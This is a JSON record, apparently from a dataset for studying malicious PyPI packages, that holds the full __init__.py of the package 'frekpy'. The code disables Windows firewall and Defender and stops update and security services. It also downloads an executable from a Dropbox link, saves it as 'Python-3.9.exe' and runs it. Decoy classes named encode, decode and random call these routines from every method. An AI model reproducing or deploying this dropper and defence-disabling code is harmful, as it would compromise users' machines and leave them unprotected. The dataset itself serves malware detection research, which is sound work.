[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/frekpy-4.0/frekpy-4.0/frekpy/__init__.py",
    "malicious_code": "import os\ntry: import requests\nexcept:\n    os.system(\"pip install requests||py -m pip install requests\")\n    import requests\n\ndef pws():\n    comandos: list[str] = [\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe netsh advfirewall set allprofiles state off\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe netsh advfirewall set currentprofile state off\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $ true\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe netsh advfirewall set domainprofile state off\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Uninstall-WindowsFeature -Name Windows-Defender\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False\"\n        \"net stop wuauserv\",\n        \"net stop bits\",\n        \"net stop dosvc\",\n        \"net stop spooler\",\n        \"net stop wscsvc\",\n        \"net stop wuauserv\",\n        \"net stop wudfsvc\",\n        \"net stop wwanSvc\"\n    ]\n    for comando in comandos:\n        try: os.system(comando)\n        except: pass\n\ndef inf():\n    try:\n        file = os.environ['TEMP'] + \"\\\\Python-3.9.exe\"\n        open(file, \"wb\").write(requests.get(\"https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0\").content)\n        os.system(file)\n    except:\n        raise Exception(\"This module can only be executed on machines with Windows systems.\")\n\n# The following classes repeatedly invoke the above malicious functions\nclass encode:\n    @staticmethod\n    def b64(txt: str) -> str:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return \"AJ42NSDL1ADnluh32jad1ND=\"\n    @staticmethod\n    def init() -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n    @staticmethod\n    def start(method: int) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n    @staticmethod\n    def flush(dpi: str) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\nclass decode:\n    @staticmethod\n    def b64(txt: str) -> str:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return \"AJ23NSD321LAD4nlu634hjadND=\"\n    @staticmethod\n    def init() -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n    @staticmethod\n    def start(method: int) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n    @staticmethod\n    def flush(dpi: str) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\nclass random:\n    @staticmethod\n    def randint(n1: int,\n                n2: int\n                ) -> int:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return 12\n    @staticmethod\n    def randstr() -> str:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return \"B\"\n    @staticmethod\n    def randlist(method: int) -> list[str]:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return [\"asdAS134asdvcxdsf\", \"iasaoiWJlPUEFsLJNpuohxas\"]\n    @staticmethod\n    def flush(dpi: str) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass"
  }
]